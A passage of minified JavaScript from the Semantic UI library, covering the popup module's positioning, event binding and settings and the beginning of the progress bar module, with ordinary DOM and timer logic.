                    y = { initialize: function() { y.debug("Initializing", T), y.createID(), y.bind.events(), !y.exists() && w.preserve && y.create(), w.observeChanges && y.observeChanges(), y.instantiate() }, instantiate: function() { y.verbose("Storing instance", y), B = y, T.data(E, B) }, observeChanges: function() { "MutationObserver" in t && (m = new MutationObserver(y.event.documentChanged), m.observe(n, { childList: !0, subtree: !0 }), y.debug("Setting up mutation observer", m)) }, refresh: function() { w.popup ? o = e(w.popup).eq(0) : w.inline && (o = I.nextAll(x.popup).eq(0), w.popup = o), w.popup ? (o.addClass(S.loading), b = y.get.offsetParent(), o.removeClass(S.loading), w.movePopup && y.has.popup() && y.get.offsetParent(o)[0] !== b[0] && (y.debug("Moving popup to the same offset parent as target"), o.detach().appendTo(b))) : b = w.inline ? y.get.offsetParent(I) : y.has.popup() ? y.get.offsetParent(o) : c, b.is("html") && b[0] !== c[0] && (y.debug("Setting page as offset parent"), b = c), y.get.variation() && y.set.variation() }, reposition: function() { y.refresh(), y.set.position() }, destroy: function() { y.debug("Destroying previous module"), m && m.disconnect(), o && !w.preserve && y.removePopup(), clearTimeout(y.hideTimer), clearTimeout(y.showTimer), y.unbind.close(), y.unbind.events(), T.removeData(E) }, event: { start: function(t) { var n = e.isPlainObject(w.delay) ? w.delay.show : w.delay;
                                clearTimeout(y.hideTimer), j || (y.showTimer = setTimeout(y.show, n)) }, end: function() { var t = e.isPlainObject(w.delay) ? w.delay.hide : w.delay;
                                clearTimeout(y.showTimer), y.hideTimer = setTimeout(y.hide, t) }, touchstart: function(e) { j = !0, y.show() }, resize: function() { y.is.visible() && y.set.position() }, documentChanged: function(t) {
                                [].forEach.call(t, function(t) { t.removedNodes && [].forEach.call(t.removedNodes, function(t) {
                                        (t == q || e(t).find(q).length > 0) && (y.debug("Element removed from DOM, tearing down events"), y.destroy()) }) }) }, hideGracefully: function(t) { var i = e(t.target),
                                    r = e.contains(n.documentElement, t.target),
                                    o = i.closest(x.popup).length > 0;
                                t && !o && r ? (y.debug("Click occurred outside popup hiding popup"), y.hide()) : y.debug("Click was inside popup, keeping popup open") } }, create: function() { var t = y.get.html(),
                                n = y.get.title(),
                                i = y.get.content();
                            t || i || n ? (y.debug("Creating pop-up html"), t || (t = w.templates.popup({ title: n, content: i })), o = e("<div/>").addClass(S.popup).data(k.activator, T).html(t), w.inline ? (y.verbose("Inserting popup element inline", o), o.insertAfter(T)) : (y.verbose("Appending popup element to body", o), o.appendTo(M)), y.refresh(), y.set.variation(), w.hoverable && y.bind.popup(), w.onCreate.call(o, q)) : 0 !== I.next(x.popup).length ? (y.verbose("Pre-existing popup found"), w.inline = !0, w.popup = I.next(x.popup).data(k.activator, T), y.refresh(), w.hoverable && y.bind.popup()) : w.popup ? (e(w.popup).data(k.activator, T), y.verbose("Used popup specified in settings"), y.refresh(), w.hoverable && y.bind.popup()) : y.debug("No content specified skipping display", q) }, createID: function() { v = (Math.random().toString(16) + "000000000").substr(2, 8), g = "." + v, y.verbose("Creating unique id for element", v) }, toggle: function() { y.debug("Toggling pop-up"), y.is.hidden() ? (y.debug("Popup is hidden, showing pop-up"), y.unbind.close(), y.show()) : (y.debug("Popup is visible, hiding pop-up"), y.hide()) }, show: function(e) { if (e = e || function() {}, y.debug("Showing pop-up", w.transition), y.is.hidden() && (!y.is.active() || !y.is.dropdown())) { if (y.exists() || y.create(), !1 === w.onShow.call(o, q)) return void y.debug("onShow callback returned false, cancelling popup animation");
                                w.preserve || w.popup || y.refresh(), o && y.set.position() && (y.save.conditions(), w.exclusive && y.hideAll(), y.animate.show(e)) } }, hide: function(e) { if (e = e || function() {}, y.is.visible() || y.is.animating()) { if (!1 === w.onHide.call(o, q)) return void y.debug("onHide callback returned false, cancelling popup animation");
                                y.remove.visible(), y.unbind.close(), y.restore.conditions(), y.animate.hide(e) } }, hideAll: function() { e(x.popup).filter("." + S.popupVisible).each(function() { e(this).data(k.activator).popup("hide") }) }, exists: function() { return !!o && (w.inline || w.popup ? y.has.popup() : o.closest(M).length >= 1) }, removePopup: function() { y.has.popup() && !w.popup && (y.debug("Removing popup", o), o.remove(), o = void 0, w.onRemove.call(o, q)) }, save: { conditions: function() { y.cache = { title: T.attr("title") }, y.cache.title && T.removeAttr("title"), y.verbose("Saving original attributes", y.cache.title) } }, restore: { conditions: function() { return y.cache && y.cache.title && (T.attr("title", y.cache.title), y.verbose("Restoring original attributes", y.cache.title)), !0 } }, supports: { svg: function() { return "undefined" == typeof SVGGraphicsElement } }, animate: { show: function(t) { t = e.isFunction(t) ? t : function() {}, w.transition && void 0 !== e.fn.transition && T.transition("is supported") ? (y.set.visible(), o.transition({ animation: w.transition + " in", queue: !1, debug: w.debug, verbose: w.verbose, duration: w.duration, onComplete: function() { y.bind.close(), t.call(o, q), w.onVisible.call(o, q) } })) : y.error(_.noTransition) }, hide: function(t) { if (t = e.isFunction(t) ? t : function() {}, y.debug("Hiding pop-up"), !1 === w.onHide.call(o, q)) return void y.debug("onHide callback returned false, cancelling popup animation");
                                w.transition && void 0 !== e.fn.transition && T.transition("is supported") ? o.transition({ animation: w.transition + " out", queue: !1, duration: w.duration, debug: w.debug, verbose: w.verbose, onComplete: function() { y.reset(), t.call(o, q), w.onHidden.call(o, q) } }) : y.error(_.noTransition) } }, change: { content: function(e) { o.html(e) } }, get: { html: function() { return T.removeData(k.html), T.data(k.html) || w.html }, title: function() { return T.removeData(k.title), T.data(k.title) || w.title }, content: function() { return T.removeData(k.content), T.data(k.content) || T.attr("title") || w.content }, variation: function() { return T.removeData(k.variation), T.data(k.variation) || w.variation }, popup: function() { return o }, popupOffset: function() { return o.offset() }, calculations: function() { var e, n = I[0],
                                    i = P[0] == t,
                                    r = w.inline || w.popup && w.movePopup ? I.position() : I.offset(),
                                    a = i ? { top: 0, left: 0 } : P.offset(),
                                    c = {},
                                    u = i ? { top: s.scrollTop(), left: s.scrollLeft() } : { top: 0, left: 0 }; return c = { target: { element: I[0], width: I.outerWidth(), height: I.outerHeight(), top: r.top, left: r.left, margin: {} }, popup: { width: o.outerWidth(), height: o.outerHeight() }, parent: { width: b.outerWidth(), height: b.outerHeight() }, screen: { top: a.top, left: a.left, scroll: { top: u.top, left: u.left }, width: P.width(), height: P.height() } }, w.setFluidWidth && y.is.fluid() && (c.container = { width: o.parent().outerWidth() }, c.popup.width = c.container.width), c.target.margin.top = w.inline ? parseInt(t.getComputedStyle(n).getPropertyValue("margin-top"), 10) : 0, c.target.margin.left = w.inline ? y.is.rtl() ? parseInt(t.getComputedStyle(n).getPropertyValue("margin-right"), 10) : parseInt(t.getComputedStyle(n).getPropertyValue("margin-left"), 10) : 0, e = c.screen, c.boundary = { top: e.top + e.scroll.top, bottom: e.top + e.scroll.top + e.height, left: e.left + e.scroll.left, right: e.left + e.scroll.left + e.width }, c }, id: function() { return v }, startEvent: function() { return "hover" == w.on ? "mouseenter" : "focus" == w.on && "focus" }, scrollEvent: function() { return "scroll" }, endEvent: function() { return "hover" == w.on ? "mouseleave" : "focus" == w.on && "blur" }, distanceFromBoundary: function(e, t) { var n, i, r = {}; return t = t || y.get.calculations(), n = t.popup, i = t.boundary, e && (r = { top: e.top - i.top, left: e.left - i.left, right: i.right - (e.left + n.width), bottom: i.bottom - (e.top + n.height) }, y.verbose("Distance from boundaries determined", e, r)), r }, offsetParent: function(t) { var n = void 0 !== t ? t[0] : I[0],
                                    i = n.parentNode,
                                    r = e(i); if (i)
                                    for (var o = "none" === r.css("transform"), a = "static" === r.css("position"), s = r.is("html"); i && !s && a && o;) i = i.parentNode, r = e(i), o = "none" === r.css("transform"), a = "static" === r.css("position"), s = r.is("html"); return r && r.length > 0 ? r : e() }, positions: function() { return { "top left": !1, "top center": !1, "top right": !1, "bottom left": !1, "bottom center": !1, "bottom right": !1, "left center": !1, "right center": !1 } }, nextPosition: function(e) { var t = e.split(" "),
                                    n = t[0],
                                    i = t[1],
                                    r = { top: "bottom", bottom: "top", left: "right", right: "left" },
                                    o = { left: "center", center: "right", right: "left" },
                                    a = { "top left": "top center", "top center": "top right", "top right": "right center", "right center": "bottom right", "bottom right": "bottom center", "bottom center": "bottom left", "bottom left": "left center", "left center": "top left" },
                                    s = "top" == n || "bottom" == n,
                                    c = !1,
                                    u = !1,
                                    l = !1; return O || (y.verbose("All available positions available"), O = y.get.positions()), y.debug("Recording last position tried", e), O[e] = !0, "opposite" === w.prefer && (l = [r[n], i], l = l.join(" "), c = !0 === O[l], y.debug("Trying opposite strategy", l)), "adjacent" === w.prefer && s && (l = [n, o[i]], l = l.join(" "), u = !0 === O[l], y.debug("Trying adjacent strategy", l)), (u || c) && (y.debug("Using backup position", l), l = a[e]), l } }, set: { position: function(e, t) { if (0 === I.length || 0 === o.length) return void y.error(_.notFound); var n, i, r, a, s, c, u, l; if (t = t || y.get.calculations(), e = e || T.data(k.position) || w.position, n = T.data(k.offset) || w.offset, i = w.distanceAway, r = t.target, a = t.popup, s = t.parent, 0 === r.width && 0 === r.height && !y.is.svg(r.element)) return y.debug("Popup target is hidden, no action taken"), !1; switch (w.inline && (y.debug("Adding margin to calculation", r.margin), "left center" == e || "right center" == e ? (n += r.margin.top, i += -r.margin.left) : "top left" == e || "top center" == e || "top right" == e ? (n += r.margin.left, i -= r.margin.top) : (n += r.margin.left, i += r.margin.top)), y.debug("Determining popup position from calculations", e, t), y.is.rtl() && (e = e.replace(/left|right/g, function(e) { return "left" == e ? "right" : "left" }), y.debug("RTL: Popup position updated", e)), D == w.maxSearchDepth && "string" == typeof w.lastResort && (e = w.lastResort), e) {
                                    case "top left":
                                        c = { top: "auto", bottom: s.height - r.top + i, left: r.left + n, right: "auto" }; break;
                                    case "top center":
                                        c = { bottom: s.height - r.top + i, left: r.left + r.width / 2 - a.width / 2 + n, top: "auto", right: "auto" }; break;
                                    case "top right":
                                        c = { bottom: s.height - r.top + i, right: s.width - r.left - r.width - n, top: "auto", left: "auto" }; break;
                                    case "left center":
                                        c = { top: r.top + r.height / 2 - a.height / 2 + n, right: s.width - r.left + i, left: "auto", bottom: "auto" }; break;
                                    case "right center":
                                        c = { top: r.top + r.height / 2 - a.height / 2 + n, left: r.left + r.width + i, bottom: "auto", right: "auto" }; break;
                                    case "bottom left":
                                        c = { top: r.top + r.height + i, left: r.left + n, bottom: "auto", right: "auto" }; break;
                                    case "bottom center":
                                        c = { top: r.top + r.height + i, left: r.left + r.width / 2 - a.width / 2 + n, bottom: "auto", right: "auto" }; break;
                                    case "bottom right":
                                        c = { top: r.top + r.height + i, right: s.width - r.left - r.width - n, left: "auto", bottom: "auto" } } if (void 0 === c && y.error(_.invalidPosition, e), y.debug("Calculated popup positioning values", c), o.css(c).removeClass(S.position).addClass(e).addClass(S.loading), u = y.get.popupOffset(), l = y.get.distanceFromBoundary(u, t), y.is.offstage(l, e)) { if (y.debug("Position is outside viewport", e), D < w.maxSearchDepth) return D++, e = y.get.nextPosition(e), y.debug("Trying new position", e), !!o && y.set.position(e, t); if (!w.lastResort) return y.debug("Popup could not find a position to display", o), y.error(_.cannotPlace, q), y.remove.attempts(), y.remove.loading(), y.reset(), w.onUnplaceable.call(o, q), !1;
                                    y.debug("No position found, showing with last position") } return y.debug("Position is on stage", e), y.remove.attempts(), y.remove.loading(), w.setFluidWidth && y.is.fluid() && y.set.fluidWidth(t), !0 }, fluidWidth: function(e) { e = e || y.get.calculations(), y.debug("Automatically setting element width to parent width", e.parent.width), o.css("width", e.container.width) }, variation: function(e) {
                                (e = e || y.get.variation()) && y.has.popup() && (y.verbose("Adding variation to popup", e), o.addClass(e)) }, visible: function() { T.addClass(S.visible) } }, remove: { loading: function() { o.removeClass(S.loading) }, variation: function(e) {
                                (e = e || y.get.variation()) && (y.verbose("Removing variation", e), o.removeClass(e)) }, visible: function() { T.removeClass(S.visible) }, attempts: function() { y.verbose("Resetting all searched positions"), D = 0, O = !1 } }, bind: { events: function() { y.debug("Binding popup events to module"), "click" == w.on && T.on("click" + A, y.toggle), "hover" == w.on && T.on("touchstart" + A, y.event.touchstart), y.get.startEvent() && T.on(y.get.startEvent() + A, y.event.start).on(y.get.endEvent() + A, y.event.end), w.target && y.debug("Target set to element", I), s.on("resize" + g, y.event.resize) }, popup: function() { y.verbose("Allowing hover events on popup to prevent closing"), o && y.has.popup() && o.on("mouseenter" + A, y.event.start).on("mouseleave" + A, y.event.end) }, close: function() {
                                (!0 === w.hideOnScroll || "auto" == w.hideOnScroll && "click" != w.on) && y.bind.closeOnScroll(), "hover" == w.on && j && y.bind.touchClose(), "click" == w.on && w.closable && y.bind.clickaway() }, closeOnScroll: function() { y.verbose("Binding scroll close event to document"), R.one(y.get.scrollEvent() + g, y.event.hideGracefully) }, touchClose: function() { y.verbose("Binding popup touchclose event to document"), a.on("touchstart" + g, function(e) { y.verbose("Touched away from popup"), y.event.hideGracefully.call(q, e) }) }, clickaway: function() { y.verbose("Binding popup close event to document"), a.on("click" + g, function(e) { y.verbose("Clicked away from popup"), y.event.hideGracefully.call(q, e) }) } }, unbind: { events: function() { s.off(g), T.off(A) }, close: function() { a.off(g), R.off(g) } }, has: { popup: function() { return o && o.length > 0 } }, is: { offstage: function(t, n) { var i = []; return e.each(t, function(e, t) { t < -w.jitter && (y.debug("Position exceeds allowable distance from edge", e, t, n), i.push(e)) }), i.length > 0 }, svg: function(e) { return y.supports.svg() && e instanceof SVGGraphicsElement }, active: function() { return T.hasClass(S.active) }, animating: function() { return void 0 !== o && o.hasClass(S.animating) }, fluid: function() { return void 0 !== o && o.hasClass(S.fluid) }, visible: function() { return void 0 !== o && o.hasClass(S.popupVisible) }, dropdown: function() { return T.hasClass(S.dropdown) }, hidden: function() { return !y.is.visible() }, rtl: function() { return "rtl" == T.css("direction") } }, reset: function() { y.remove.visible(), w.preserve ? void 0 !== e.fn.transition && o.transition("remove transition") : y.removePopup() }, setting: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, w, t);
                            else { if (void 0 === n) return w[t];
                                w[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, y, t);
                            else { if (void 0 === n) return y[t];
                                y[t] = n } }, debug: function() {!w.silent && w.debug && (w.performance ? y.performance.log(arguments) : (y.debug = Function.prototype.bind.call(console.info, console, w.name + ":"), y.debug.apply(console, arguments))) }, verbose: function() {!w.silent && w.verbose && w.debug && (w.performance ? y.performance.log(arguments) : (y.verbose = Function.prototype.bind.call(console.info, console, w.name + ":"), y.verbose.apply(console, arguments))) }, error: function() { w.silent || (y.error = Function.prototype.bind.call(console.error, console, w.name + ":"), y.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                w.performance && (t = (new Date).getTime(), i = l || t, n = t - i, l = t, d.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: q, "Execution Time": n })), clearTimeout(y.performance.timer), y.performance.timer = setTimeout(y.performance.display, 500) }, display: function() { var t = w.name + ":",
                                    n = 0;
                                l = !1, clearTimeout(y.performance.timer), e.each(d, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", u && (t += " '" + u + "'"), (void 0 !== console.group || void 0 !== console.table) && d.length > 0 && (console.groupCollapsed(t), console.table ? console.table(d) : e.each(d, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), d = [] } }, invoke: function(t, n, i) { var o, a, s, c = B; return n = n || p, i = q || i, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] && (a = c[i], !1);
                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(i, n) : void 0 !== a && (s = a), e.isArray(r) ? r.push(s) : void 0 !== r ? r = [r, s] : void 0 !== s && (r = s), a } }, h ? (void 0 === B && y.initialize(), y.invoke(f)) : (void 0 !== B && B.invoke("destroy"), y.initialize()) }), void 0 !== r ? r : this }, e.fn.popup.settings = { name: "Popup", silent: !1, debug: !1, verbose: !1, performance: !0, namespace: "popup", observeChanges: !0, onCreate: function() {}, onRemove: function() {}, onShow: function() {}, onVisible: function() {}, onHide: function() {}, onUnplaceable: function() {}, onHidden: function() {}, on: "hover", boundary: t, addTouchEvents: !0, position: "top left", variation: "", movePopup: !0, target: !1, popup: !1, inline: !1, preserve: !1, hoverable: !1, content: !1, html: !1, title: !1, closable: !0, hideOnScroll: "auto", exclusive: !1, context: "body", scrollContext: t, prefer: "opposite", lastResort: !1, delay: { show: 50, hide: 70 }, setFluidWidth: !0, duration: 200, transition: "scale", distanceAway: 0, jitter: 2, offset: 0, maxSearchDepth: 15, error: { invalidPosition: "The position you specified is not a valid position", cannotPlace: "Popup does not fit within the boundaries of the viewport", method: "The method you called is not defined.", noTransition: "This module requires ui transitions <https://github.com/Semantic-Org/UI-Transition>", notFound: "The target or popup you specified does not exist on the page" }, metadata: { activator: "activator", content: "content", html: "html", offset: "offset", position: "position", title: "title", variation: "variation" }, className: { active: "active", animating: "animating", dropdown: "dropdown", fluid: "fluid", loading: "loading", popup: "ui popup", position: "top left center bottom right", visible: "visible", popupVisible: "visible" }, selector: { popup: ".ui.popup" }, templates: { escape: function(e) { var t = /[&<>"'`]/g,
                            n = /[&<>"'`]/,
                            i = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#x27;", "`": "&#x60;" },
                            r = function(e) { return i[e] }; return n.test(e) ? e.replace(t, r) : e }, popup: function(t) { var n = "",
                            i = e.fn.popup.settings.templates.escape; return void 0 !== typeof t && (void 0 !== typeof t.title && t.title && (t.title = i(t.title), n += '<div class="header">' + t.title + "</div>"), void 0 !== typeof t.content && t.content && (t.content = i(t.content), n += '<div class="content">' + t.content + "</div>")), n } } } }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")();
            void 0 !== t && t.Math == Math || ("undefined" != typeof self && self.Math == Math ? self : Function("return this")());
            e.fn.progress = function(t) { var i, r = e(this),
                    o = r.selector || "",
                    a = (new Date).getTime(),
                    s = [],
                    c = arguments[0],
                    u = "string" == typeof c,
                    l = [].slice.call(arguments, 1); return r.each(function() { var r, d, f = e.isPlainObject(t) ? e.extend(!0, {}, e.fn.progress.settings, t) : e.extend({}, e.fn.progress.settings),
                        h = f.className,
                        p = f.metadata,
                        b = f.namespace,
                        m = f.selector,
                        g = f.error,
                        v = "." + b,
                        y = "module-" + b,
                        w = e(this),
                        x = e(this).find(m.bar),
                        S = e(this).find(m.progress),
                        _ = e(this).find(m.label),
                        k = this,
                        C = w.data(y),
                        A = !1;
                    d = { initialize: function() { d.debug("Initializing progress bar", f), d.set.duration(), d.set.transitionEvent(), d.read.metadata(), d.read.settings(), d.instantiate() }, instantiate: function() { d.verbose("Storing instance of progress", d), C = d, w.data(y, d) }, destroy: function() { d.verbose("Destroying previous progress for", w), clearInterval(C.interval), d.remove.state(), w.removeData(y), C = void 0 }, reset: function() { d.remove.nextValue(), d.update.progress(0) }, complete: function() {
                            (void 0 === d.percent || d.percent < 100) && (d.remove.progressPoll(), d.set.percent(100)) }, read: { metadata: function() { var e = { percent: w.data(p.percent), total: w.data(p.total), value: w.data(p.value) };
                                e.percent && (d.debug("Current percent value set from metadata", e.percent), d.set.percent(e.percent)), e.total && (d.debug("Total value set from metadata", e.total), d.set.total(e.total)), e.value && (d.debug("Current value set from metadata", e.value), d.set.value(e.value), d.set.progress(e.value)) }, settings: function() {!1 !== f.total && (d.debug("Current total set in settings", f.total), d.set.total(f.total)), !1 !== f.value && (d.debug("Current value set in settings", f.value), d.set.value(f.value), d.set.progress(d.value)), !1 !== f.percent && (d.debug("Current percent set in settings", f.percent), d.set.percent(f.percent)) } }, bind: { transitionEnd: function(e) { var t = d.get.transitionEnd();
                                x.one(t + v, function(t) { clearTimeout(d.failSafeTimer), e.call(this, t) }), d.failSafeTimer = setTimeout(function() { x.triggerHandler(t) }, f.duration + f.failSafeDelay), d.verbose("Adding fail safe timer", d.timer) } }, increment: function(e) { var t, n;
                            d.has.total() ? (t = d.get.value(), e = e || 1, n = t + e) : (t = d.get.percent(), e = e || d.get.randomValue(), n = t + e, 100, d.debug("Incrementing percentage by", t, n)), n = d.get.normalizedValue(n), d.set.progress(n) }, decrement: function(e) { var t, n, i = d.get.total();
                            i ? (t = d.get.value(), e = e || 1, n = t - e, d.debug("Decrementing value by", e, t)) : (t = d.get.percent(), e = e || d.get.randomValue(), n = t - e, d.debug("Decrementing percentage by", e, t)), n = d.get.normalizedValue(n), d.set.progress(n) }, has: { progressPoll: function() { return d.progressPoll }, total: function() { return !1 !== d.get.total() } }, get: { text: function(e) { var t = d.value || 0,
                                    n = d.total || 0,
                                    i = A ? d.get.displayPercent() : d.percent || 0,
                                    r = d.total > 0 ? n - t : 100 - i; return e = e || "", e = e.replace("{value}", t).replace("{total}", n).replace("{left}", r).replace("{percent}", i), d.verbose("Adding variables to progress bar text", e), e }, normalizedValue: function(e) { if (e < 0) return d.debug("Value cannot decrement below 0"), 0; if (d.has.total()) { if (e > d.total) return d.debug("Value cannot increment above total", d.total), d.total } else if (e > 100) return d.debug("Value cannot increment above 100 percent"), 100; return e }, updateInterval: function() { return "auto" == f.updateInterval ? f.duration : f.updateInterval }, randomValue: function() { return d.debug("Generating random increment percentage"), Math.floor(Math.random() * f.random.max + f.random.min) }, numericValue: function(e) { return "string" == typeof e ? "" !== e.replace(/[^\d.]/g, "") && +e.replace(/[^\d.]/g, "") : e }, transitionEnd: function() { var e, t = n.createElement("element"),
                                    i = { transition: "transitionend", OTransition: "oTransitionEnd", MozTransition: "transitionend", WebkitTransition: "webkitTransitionEnd" }; for (e in i)
                                    if (void 0 !== t.style[e]) return i[e] }, displayPercent: function() { var e = x.width(),
                                    t = w.width(),
                                    n = parseInt(x.css("min-width"), 10),
                                    i = e > n ? e / t * 100 : d.percent; return f.precision > 0 ? Math.round(i * (10 * f.precision)) / (10 * f.precision) : Math.round(i) }, percent: function() { return d.percent || 0 }, value: function() { return d.nextValue || d.value || 0 }, total: function() { return d.total || !1 } }, create: { progressPoll: function() { d.progressPoll = setTimeout(function() { d.update.toNextValue(), d.remove.progressPoll() }, d.get.updateInterval()) } }, is: { complete: function() { return d.is.success() || d.is.warning() || d.is.error() }, success: function() { return w.hasClass(h.success) }, warning: function() { return w.hasClass(h.warning) }, error: function() { return w.hasClass(h.error) }, active: function() { return w.hasClass(h.active) }, visible: function() { return w.is(":visible") } }, remove: { progressPoll: function() { d.verbose("Removing progress poll timer"), d.progressPoll && (clearTimeout(d.progressPoll), delete d.progressPoll) }, nextValue: function() { d.verbose("Removing progress value stored for next update"), delete d.nextValue }, state: function() { d.verbose("Removing stored state"), delete d.total, delete d.percent, delete d.value }, active: function() { d.verbose("Removing active state"), w.removeClass(h.active) }, success: function() { d.verbose("Removing success state"), w.removeClass(h.success) }, warning: function() { d.verbose("Removing warning state"), w.removeClass(h.warning) }, error: function() { d.verbose("Removing error state"), w.removeClass(h.error) } }, set: { barWidth: function(e) { e > 100 ? d.error(g.tooHigh, e) : e < 0 ? d.error(g.tooLow, e) : (x.css("width", e + "%"), w.attr("data-percent", parseInt(e, 10))) }, duration: function(e) { e = e || f.duration, e = "number" == typeof e ? e + "ms" : e, d.verbose("Setting progress bar transition duration", e), x.css({ "transition-duration": e }) }, percent: function(e) { e = "string" == typeof e ? +e.replace("%", "") : e, e = f.precision > 0 ? Math.round(e * (10 * f.precision)) / (10 * f.precision) : Math.round(e), d.percent = e, d.has.total() || (d.value = f.precision > 0 ? Math.round(e / 100 * d.total * (10 * f.precision)) / (10 * f.precision) : Math.round(e / 100 * d.total * 10) / 10, f.limitValues && (d.value = d.value > 100 ? 100 : d.value < 0 ? 0 : d.value)), d.set.barWidth(e), d.set.labelInterval(), d.set.labels(), f.onChange.call(k, e, d.value, d.total) }, labelInterval: function() { var t = function() { d.verbose("Bar finished animating, removing continuous label updates"), clearInterval(d.interval), A = !1, d.set.labels() };
                                clearInterval(d.interval), d.bind.transitionEnd(t), A = !0, d.interval = setInterval(function() { e.contains(n.documentElement, k) || (clearInterval(d.interval), A = !1), d.set.labels() }, f.framerate) }, labels: function() { d.verbose("Setting both bar progress and outer label text"), d.set.barLabel(), d.set.state() }, label: function(e) {
                                (e = e || "") && (e = d.get.text(e), d.verbose("Setting label to text", e), _.text(e)) }, state: function(e) { e = void 0 !== e ? e : d.percent, 100 === e ? f.autoSuccess && !(d.is.warning() || d.is.error() || d.is.success()) ? (d.set.success(), d.debug("Automatically triggering success at 100%")) : (d.verbose("Reached 100% removing active state"), d.remove.active(), d.remove.progressPoll()) : e > 0 ? (d.verbose("Adjusting active progress bar label", e), d.set.active()) : (d.remove.active(), d.set.label(f.text.active)) }, barLabel: function(e) { void 0 !== e ? S.text(d.get.text(e)) : "ratio" == f.label && d.total ? (d.verbose("Adding ratio to bar label"), S.text(d.get.text(f.text.ratio))) : "percent" == f.label && (d.verbose("Adding percentage to bar label"), S.text(d.get.text(f.text.percent))) }, active: function(e) { e = e || f.text.active, d.debug("Setting active state"), f.showActivity && !d.is.active() && w.addClass(h.active), d.remove.warning(), d.remove.error(), d.remove.success(), e = f.onLabelUpdate("active", e, d.value, d.total), e && d.set.label(e), d.bind.transitionEnd(function() { f.onActive.call(k, d.value, d.total) }) }, success: function(e) { e = e || f.text.success || f.text.active, d.debug("Setting success state"), w.addClass(h.success), d.remove.active(), d.remove.warning(), d.remove.error(), d.complete(), f.text.success ? (e = f.onLabelUpdate("success", e, d.value, d.total), d.set.label(e)) : (e = f.onLabelUpdate("active", e, d.value, d.total), d.set.label(e)), d.bind.transitionEnd(function() { f.onSuccess.call(k, d.total) }) }, warning: function(e) { e = e || f.text.warning, d.debug("Setting warning state"), w.addClass(h.warning), d.remove.active(), d.remove.success(), d.remove.error(), d.complete(), e = f.onLabelUpdate("warning", e, d.value, d.total), e && d.set.label(e), d.bind.transitionEnd(function() { f.onWarning.call(k, d.value, d.total) }) }, error: function(e) { e = e || f.text.error, d.debug("Setting error state"), w.addClass(h.error), d.remove.active(), d.remove.success(), d.remove.warning(), d.complete(), e = f.onLabelUpdate("error", e, d.value, d.total), e && d.set.label(e), d.bind.transitionEnd(function() { f.onError.call(k, d.value, d.total) }) }, transitionEvent: function() { r = d.get.transitionEnd() }, total: function(e) { d.total = e }, value: function(e) { d.value = e }, progress: function(e) { d.has.progressPoll() ? (d.debug("Updated within interval, setting next update to use new value", e), d.set.nextValue(e)) : (d.debug("First update in progress update interval, immediately updating", e), d.update.progress(e), d.create.progressPoll()) }, nextValue: function(e) { d.nextValue = e } }, update: { toNextValue: function() { var e = d.nextValue;
                                e && (d.debug("Update interval complete using last updated value", e), d.update.progress(e), d.remove.nextValue()) }, progress: function(e) { var t;
                                e = d.get.numericValue(e), !1 === e && d.error(g.nonNumeric, e), e = d.get.normalizedValue(e), d.has.total() ? (d.set.value(e), t = e / d.total * 100, d.debug("Calculating percent complete from total", t), d.set.percent(t)) : (t = e, d.debug("Setting value to exact percentage value", t), d.set.percent(t)) } }, setting: function(t, n) { if (d.debug("Changing setting", t, n), e.isPlainObject(t)) e.extend(!0, f, t);
                            else { if (void 0 === n) return f[t];
                                e.isPlainObject(f[t]) ? e.extend(!0, f[t], n) : f[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, d, t);
                            else { if (void 0 === n) return d[t];
                                d[t] = n } }, debug: function() {!f.silent && f.debug && (f.performance ? d.performance.log(arguments) : (d.debug = Function.prototype.bind.call(console.info, console, f.name + ":"), d.debug.apply(console, arguments))) }, verbose: function() {!f.silent && f.verbose && f.debug && (f.performance ? d.performance.log(arguments) : (d.verbose = Function.prototype.bind.call(console.info, console, f.name + ":"), d.verbose.apply(console, arguments))) }, error: function() { f.silent || (d.error = Function.prototype.bind.call(console.error, console, f.name + ":"), d.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                f.performance && (t = (new Date).getTime(), i = a || t, n = t - i, a = t, s.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: k, "Execution Time": n })), clearTimeout(d.performance.timer), d.performance.timer = setTimeout(d.performance.display, 500) }, display: function() { var t = f.name + ":",
                                    n = 0;
                                a = !1, clearTimeout(d.performance.timer), e.each(s, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", o && (t += " '" + o + "'"), (void 0 !== console.group || void 0 !== console.table) && s.length > 0 && (console.groupCollapsed(t), console.table ? console.table(s) : e.each(s, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), s = [] } }, invoke: function(t, n, r) { var o, a, s, c = C; return n = n || l, r = k || r, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] ? (a = c[i], !1) : (d.error(g.method, t), !1);
